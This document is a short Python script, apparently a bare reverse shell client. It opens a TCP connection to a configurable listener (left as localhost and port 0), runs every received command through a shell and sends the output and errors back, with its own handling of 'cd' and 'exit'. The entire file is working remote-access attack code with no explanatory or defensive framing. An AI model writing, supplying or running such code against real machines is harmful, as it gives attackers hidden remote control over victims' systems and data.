import socket as sk
import subprocess as sp
import os

LHOST = 'localhost'
PORT = 0
server = (LHOST, PORT)

sok = sk.socket(sk.AF_INET, sk.SOCK_STREAM)

sok.connect(server)

current_dir = os.getcwd()  

while True:
    command = sok.recv(1024).decode()

    if command.lower() == 'exit':
        sok.close()
        break

    check = command.strip()
    check = command.split()

    if check[0].lower() == 'cd':
        try:
            os.chdir(' '.join(check[1:]))
            current_dir = os.getcwd()
            sok.send(f'{current_dir} \n\n'.encode())
        except Exception as e:
            sok.send(str(e).encode())
    else:
        proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
        output, error = proc.communicate()
        sok.send(output)
        sok.send(error)